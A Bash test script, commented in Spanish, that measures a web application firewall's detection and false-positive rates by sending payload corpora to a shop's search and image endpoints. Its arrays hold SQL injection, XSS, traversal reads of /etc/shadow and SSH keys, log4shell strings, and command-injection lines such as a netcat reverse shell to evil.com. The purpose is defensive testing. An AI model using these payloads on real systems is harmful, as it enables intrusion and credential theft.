#!/bin/bash
# Corpus amplio para medir, a escala, dos métricas que con 18/13 no son
# significativas:
#   - TASA DE DETECCIÓN  : % de ataques que el WAF bloquea (attack_corpus, 100+).
#   - TASA DE FALSOS POS.: % de tráfico legítimo que el WAF bloquea (happy_corpus, 100+).
#
# Complementa el mapeo 1-a-1 del pre-entrega en cases.sh (18 ataques / 13
# legítimos, que son el gate de regresión y deben dar 100%). Acá la diversidad
# importa más que el "todo verde": un corpus amplio puede mostrar algún bypass
# (ataque exótico que pasa) o algún FP — eso es información útil, no un error.
#
# Lo consumen attacks-corpus.sh / happy-corpus.sh vía run_case() de lib.sh.
# Cada payload de q=/file= se manda url-encodeado (--data-urlencode); el WAF
# lo decodifica e inspecciona igual.

# ===========================  ATAQUES (deben dar 403)  ======================

# --- SQL Injection (sobre /catalog/search?q=) ---
SQLI=(
  "' OR 1=1--"
  "' OR '1'='1"
  "' OR 1=1#"
  "' OR 1=1/*"
  "admin'--"
  "admin'#"
  "' UNION SELECT NULL--"
  "' UNION SELECT NULL,NULL--"
  "' UNION SELECT username,password FROM users--"
  "' UNION ALL SELECT 1,2,3--"
  "1' AND '1'='1"
  "1' AND '1'='2"
  "' AND SLEEP(5)--"
  "' OR SLEEP(5)#"
  "'; WAITFOR DELAY '0:0:5'--"
  "1; DROP TABLE users--"
  "1); DROP TABLE products--"
  "' OR 'x'='x"
  "\") OR (\"1\"=\"1"
  "' OR 1=1 LIMIT 1--"
  "' ORDER BY 10--"
  "' GROUP BY columnname HAVING 1=1--"
  "' AND extractvalue(1,concat(0x7e,version()))--"
  "' AND updatexml(1,concat(0x7e,user()),1)--"
  "' UNION SELECT @@version--"
  "' UNION SELECT table_name FROM information_schema.tables--"
  "' OR 1=1 INTO OUTFILE '/tmp/x'--"
  "1 PROCEDURE ANALYSE(1,1)--"
  "'||(SELECT password FROM users LIMIT 1)||'"
  "' AND 1=CONVERT(int,@@version)--"
)

# --- XSS (sobre /catalog/search?q=) ---
XSS=(
  "<script>alert(1)</script>"
  "<img src=x onerror=alert(1)>"
  "<svg onload=alert(1)>"
  "<body onload=alert(1)>"
  "<iframe src=javascript:alert(1)>"
  "\"><script>alert(1)</script>"
  "<a href=\"javascript:alert(1)\">x</a>"
  "<div onmouseover=alert(1)>x</div>"
  "<input autofocus onfocus=alert(1)>"
  "<details open ontoggle=alert(1)>"
  "javascript:alert(document.cookie)"
  "<script>document.location='//evil'</script>"
  "<img src=1 onerror=\"fetch('//evil')\">"
  "<svg><script>alert(1)</script></svg>"
  "'\"><img src=x onerror=alert(1)>"
  "<marquee onstart=alert(1)>x</marquee>"
  "<video><source onerror=alert(1)></video>"
  "<object data=javascript:alert(1)></object>"
  "<embed src=javascript:alert(1)>"
  "<ScRiPt>alert(1)</ScRiPt>"
  "<img/src/onerror=alert(1)>"
  "<svg/onload=alert(1)>"
  "<base href=javascript:alert(1)//>"
  "<form action=javascript:alert(1)><input type=submit>"
  "<isindex action=javascript:alert(1) type=submit>"
)

# --- Path traversal / LFI (sobre /catalog/image?file=, crudo en la URL) ---
TRAVERSAL=(
  "../../../../etc/passwd"
  "../../../../etc/shadow"
  "../../../../etc/hosts"
  "../../../../etc/group"
  "../../../../proc/self/environ"
  "../../../../proc/self/cmdline"
  "../../../../proc/version"
  "../../../../root/.ssh/id_rsa"
  "../../../../var/log/nginx/access.log"
  "../../../../etc/nginx/nginx.conf"
  "../../../../../../../../etc/passwd"
  "....//....//....//....//etc/passwd"
  "..%2f..%2f..%2f..%2fetc%2fpasswd"
  "..%252f..%252f..%252fetc%252fpasswd"
  "/etc/passwd"
  "..\\..\\..\\..\\windows\\win.ini"
  "..%c0%af..%c0%afetc/passwd"
  "file:///etc/passwd"
  "../../../../etc/passwd%00.jpg"
  "../../../../etc/mysql/my.cnf"
)

# --- Command injection (sobre /catalog/search?q=) ---
CMDI=(
  "; cat /etc/passwd"
  "| cat /etc/passwd"
  "\`id\`"
  "\$(id)"
  "; ls -la /"
  "&& whoami"
  "|| ping -c 1 evil.com"
  "; curl http://evil.com/x"
  "\`wget http://evil.com\`"
  "; nc -e /bin/sh evil.com 4444"
  "\$(curl evil.com)"
  "; uname -a"
)

# --- Otros (SSTI / log4shell / LDAP / NoSQL / XXE / shellshock) sobre q= ---
PROTO=(
  "{{7*7}}"
  "\${7*7}"
  "#{7*7}"
  "{{config}}"
  "\${jndi:ldap://evil.com/a}"
  "\${jndi:rmi://evil.com/a}"
  "*)(uid=*))(|(uid=*"
  "*)(|(objectclass=*))"
  "' || '1'=='1"
  "{\"\$gt\":\"\"}"
  "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
  "() { :; }; echo vulnerable"
  "__proto__[admin]=true"
)

# --- Scanners / herramientas automáticas (header User-Agent) ---
# Cubiertos por la regla custom 4001 → modo DETECCIÓN: pasan (200) y se loguean.
SCANNER_UA_DETECT=(
  "sqlmap/1.7.2#stable"
  "Nikto/2.5.0"
  "Nmap Scripting Engine"
  "WPScan v3.8.22"
  "Mozilla/5.00 (Nikto/2.1.6)"
)
# Cubiertos por el CRS (913100) → modo BLOQUEO (403). Acunetix queda como miss
# conocido (no está ni en la lista del CRS ni en la regla 4001).
SCANNER_UA=(
  "Nessus SOAP"
  "Arachni/v1.5.1"
  "ZmEu"
  "masscan/1.3"
  "dirbuster"
  "Acunetix Web Vulnerability Scanner"
  "WhatWeb/0.5"
)

# =========================  LEGÍTIMO (NO debe bloquear)  ====================

# --- Búsquedas benignas (palabras de producto; 200 OK) ---
BENIGN_Q=(
  red blue green black white navy teal aqua maroon beige
  leather cotton ceramic wooden steel glass bamboo wool silk linen
  mug shirt shoes hat bag watch lamp chair table desk
  sofa pillow blanket bottle cup plate bowl knife fork spoon
  pan kettle jacket jeans socks scarf gloves belt wallet backpack
  umbrella notebook pencil charger cable speaker headphones keyboard monitor stylus
  "blue mug" "leather bag" "running shoes" "coffee table" "wireless headphones"
  "ceramic bowl" "wooden chair" "cotton shirt" "steel bottle" "glass cup"
  "size 10" "size large" "150" "500ml" "2 pack"
  "rock and roll" "salt and pepper" "shoes like nike" "sounds like teen spirit"
  "black and white" "pots and pans" "now and then" "this or that"
  vintage modern classic premium "best seller" "new arrival" "limited edition"
  "eco friendly" "hand made"
)

# --- Legítimo con caracteres especiales (deben pasar; prueban FP) ---
BENIGN_EDGE=(
  "salt & pepper" "AT&T" "100 cotton" "C# book" "node js guide"
  "café latte" "naïve art" "jalapeño" "size: large" "2x4 lumber"
  "best-seller" "t-shirt" "e-reader"
)

attack_corpus() {
  local i p ua
  print_section "SQL Injection (${#SQLI[@]})"
  i=0; for p in "${SQLI[@]}"; do run_case "SQLi $((++i))" block --get --data-urlencode "q=$p" "$BASE/catalog/search"; done
  print_section "XSS (${#XSS[@]})"
  i=0; for p in "${XSS[@]}"; do run_case "XSS $((++i))" block --get --data-urlencode "q=$p" "$BASE/catalog/search"; done
  print_section "Path traversal / LFI (${#TRAVERSAL[@]})"
  i=0; for p in "${TRAVERSAL[@]}"; do run_case "Traversal $((++i))" block "$BASE/catalog/image?file=$p"; done
  print_section "Command injection (${#CMDI[@]})"
  i=0; for p in "${CMDI[@]}"; do run_case "CMDi $((++i))" block --get --data-urlencode "q=$p" "$BASE/catalog/search"; done
  print_section "Otros: SSTI/log4shell/LDAP/NoSQL/XXE/shellshock (${#PROTO[@]})"
  i=0; for p in "${PROTO[@]}"; do run_case "Proto $((++i))" block --get --data-urlencode "q=$p" "$BASE/catalog/search"; done
  print_section "Scanner UA — CRS, bloqueo (${#SCANNER_UA[@]})"
  i=0; for ua in "${SCANNER_UA[@]}"; do run_case "Scanner CRS $((++i))" block -A "$ua" "$BASE/"; done
  print_section "Scanner UA — regla 4001, detección (${#SCANNER_UA_DETECT[@]})"
  i=0; for ua in "${SCANNER_UA_DETECT[@]}"; do run_case "Scanner det $((++i))" detect -A "$ua" "$BASE/"; done
}

happy_corpus() {
  local i q
  print_section "Búsquedas legítimas (${#BENIGN_Q[@]})"
  i=0; for q in "${BENIGN_Q[@]}"; do run_case "Search $((++i))" allow --get --data-urlencode "q=$q" "$BASE/catalog/search"; done
  print_section "Legítimo con caracteres especiales (${#BENIGN_EDGE[@]})"
  i=0; for q in "${BENIGN_EDGE[@]}"; do run_case "Edge $((++i))" allow --get --data-urlencode "q=$q" "$BASE/catalog/search"; done
  print_section "Navegación de páginas"
  run_case "Home"           allow "$BASE/"
  run_case "Catalog"        allow "$BASE/catalog"
  run_case "Cart"           allow "$BASE/cart"
  run_case "Checkout"       allow "$BASE/checkout"
  run_case "Product detail" allow "$BASE/catalog/d27cf49f-b689-4a75-a249-d373e0330bb5"
}
